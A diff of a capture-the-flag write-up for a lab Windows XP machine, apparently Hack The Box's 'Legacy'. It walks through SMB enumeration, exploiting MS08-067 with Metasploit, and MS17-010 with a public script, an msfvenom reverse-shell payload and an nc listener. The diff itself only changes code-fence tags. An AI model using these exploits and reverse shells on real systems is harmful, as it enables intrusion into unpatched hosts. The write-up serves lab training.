@@ -29,7 +29,7 @@ Port `139` is a netbios-ssn service while port `435` is a microsoft-ds service. 
 
 Knowing that the 2 ports are running a SMB service, we will now use Namp to find out to type of SMB service running on these ports
 
-```bash
+```
 | smb-os-discovery: 
 |   OS: Windows XP (Windows 2000 LAN Manager)
 |   OS CPE: cpe:/o:microsoft:windows_xp::-
@@ -43,7 +43,7 @@ Knowing that the 2 ports are running a SMB service, we will now use Namp to find
 
 I've also come to discover that SMBv1 that this box is using is prone to several famous vulnerabilities such as EternalBlue and EternalRomance. Keeping that in mind, I've decided to run a Nmap script to check for potential CVE vulnerabilities. As it turns out, this box is vulnerable to ```CVE 2008-4250``` and ```CVE 2017-0143``` (Fun fact: CVE 2017-0143 is also known as an EternalBlue exploit that was associated with the famous WannaCry ransomware)
 
-```bash
+```
 Host script results:
 | smb-vuln-ms08-067: 
 |   VULNERABLE:
@@ -80,7 +80,7 @@ Host script results:
 
 For CVE 2008-4250, we will be using Metasploit to exploit the vulnerability (Can't seem to find any working exploit online :o). In my opinion, this exploit is a much easier way to obtain all the flags since we are granted access to the SMB server with full root privileges.
 
-```bash
+```
 msf6 > use exploit/windows/smb/ms08_067_netapi
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
@@ -102,7 +102,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 #### Obtaining user flag
 
-```bash
+```
 meterpreter > cd ..
 meterpreter > cd ..
 meterpreter > pwd
@@ -160,7 +160,7 @@ meterpreter > cat user.txt
 
 #### Obtaining the system flag
 
-```bash
+```
 meterpreter > cd ..
 meterpreter > cd ..
 meterpreter > pwd
@@ -219,7 +219,7 @@ For this exploit, we are going to use the script from [here](https://github.com/
 
 To do that, we will first need to install the `virtualenv` module in our local machine and add the `virtualenv` module to path so that we can call it from any directory.
 
-```bash
+```
 ┌──(kali㉿kali)-[~]
 └─$ pip3 install virtualenv 
 ┌──(kali㉿kali)-[~]
@@ -228,14 +228,14 @@ To do that, we will first need to install the `virtualenv` module in our local m
 
 Next, we will then create our virtual environment that is running on `python2.7` and activate the virtual environment
 
-```bash
+```
 ┌──(kali㉿kali)-[~]
 └─$ virtualenv --python=/usr/bin/python2.7 /home/kali/Desktop/htb && source htb/bin/activate
 ```
 
 Next, we will have to clone the repository and install `impacket` using `pip` as it is a dependency that we need later.
 
-```bash
+```
 ┌──(htb)─(kali㉿kali)-[~]
 └─$ git clone https://github.com/helviojunior/MS17-010 && pip install impacket 
 ```
@@ -244,7 +244,7 @@ The exploit runs with the following exploit with the following syntax `send_and_
 
 To do so, we will have to create the executable file with `msfvenom`
 
-```bash
+```
 ┌──(kali㉿kali)-[~/Desktop/MS17-010]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.250 LPORT=443 EXITFUNC=thread -f exe -a x86 — platform windows -o rev_shell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -256,14 +256,14 @@ Final size of exe file: 73802 bytes
 
 Next we will have to open a listener shell on the attacker's machine.
 
-```bash
+```
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -nlvp 443
 ```
 
 All that is left for us to do, is to execute the exploit.
 
-```bash
+```
 ┌──(htb)─(kali㉿kali)-[~/Desktop/MS17-010]
 └─$ python2 send_and_execute.py 10.10.10.4 rev_shell.exe             1 ⨯ 2 ⚙
 Trying to connect to 10.10.10.4:445
@@ -300,7 +300,7 @@ Done
 
 Finally, we will obtain a connection on the attacker machine. 
 
-```bash
+```
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
@@ -313,7 +313,7 @@ C:\WINDOWS\system32>
 
 #### Obtaining user flag
 
-```bash
+```
 C:\WINDOWS\system32>cd ../..
 cd ../..
 C:\>cd Documents and Settings\john\desktop 
@@ -325,7 +325,7 @@ type user.txt
 
 #### Obtaining system flag
 
-```bash
+```
 C:\Documents and Settings\john\Desktop>cd ../..
 cd ../..
 C:\Documents and Settings>cd Administrator\Desktop
